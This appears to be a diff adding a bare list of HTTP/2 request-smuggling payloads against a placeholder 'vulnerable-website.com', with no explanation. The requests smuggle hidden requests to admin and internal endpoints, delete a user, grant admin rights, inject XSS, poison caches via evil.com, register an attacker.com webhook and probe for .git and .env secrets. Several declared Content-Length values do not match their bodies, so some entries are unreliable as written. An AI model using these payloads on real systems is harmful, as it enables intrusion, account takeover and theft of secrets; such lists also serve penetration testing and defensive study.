@@ -1,0 +1,301 @@
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+content-length: 4
+
+TEST
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Foo: bar\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /test HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+content-length: 0
+
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 127.0.0.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+content-length: 0
+transfer-encoding: chunked
+
+0
+
+SMUGGLED
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 8
+
+SMUGGLED
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /admin
+:authority: localhost
+content-length: 0
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 50
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+foo: bar
+content-length: 50
+
+GET /test HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+X-Custom-Header: inject\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /smuggled HTTP/1.1\r\n
+\r\n
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /api
+:authority: vulnerable-website.com
+content-length: 0
+
+GET /api/users HTTP/1.1
+X-API-Key: smuggled
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 60
+
+GET /private HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+x-forwarded-for: 127.0.0.1
+content-length: 0
+
+GET /admin HTTP/1.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+POST /admin/delete HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+username=victim
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /search
+:authority: vulnerable-website.com
+content-length: 70
+
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: attacker.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+Transfer-Encoding: chunked
+
+0
+
+GET /cache-poison HTTP/1.1
+Host: evil.com
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+:scheme: https
+x-forwarded-proto: http
+content-length: 0
+
+GET / HTTP/1.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 85
+
+GET /api/internal HTTP/1.1
+Host: localhost
+X-Internal-Request: true
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /graphql
+:authority: vulnerable-website.com
+content-type: application/json
+content-length: 45
+
+{"query":"{ __schema { types { name } } }"}
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+PATCH /api/users/1 HTTP/1.1
+Content-Type: application/json
+Content-Length: 18
+
+{"admin":true}
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: GET
+:path: /
+:authority: vulnerable-website.com
+content-length: 0
+
+DELETE /api/resource HTTP/1.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+PUT /api/config HTTP/1.1
+Content-Type: application/json
+Content-Length: 30
+
+{"setting":"malicious_value"}
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /webhook
+:authority: vulnerable-website.com
+content-type: application/json
+content-length: 50
+
+{"url":"http://attacker.com/callback"}
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+HEAD /admin HTTP/1.1
+X-Method-Override: POST
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: OPTIONS
+:path: /api
+:authority: vulnerable-website.com
+access-control-request-method: POST
+content-length: 0
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 65
+
+OPTIONS /admin HTTP/1.1
+Access-Control-Request-Method: DELETE
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /
+:authority: vulnerable-website.com
+cookie: session=victim_session
+content-length: 0
+
+GET /account HTTP/1.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+TRACE / HTTP/1.1
+Max-Forwards: 0
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: CONNECT
+:authority: internal-server:443
+content-length: 0
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+GET /.git/config HTTP/1.1
+
+
+POST / HTTP/2
+Host: vulnerable-website.com
+:method: POST
+:path: /.env
+:authority: vulnerable-website.com
+content-length: 0
+
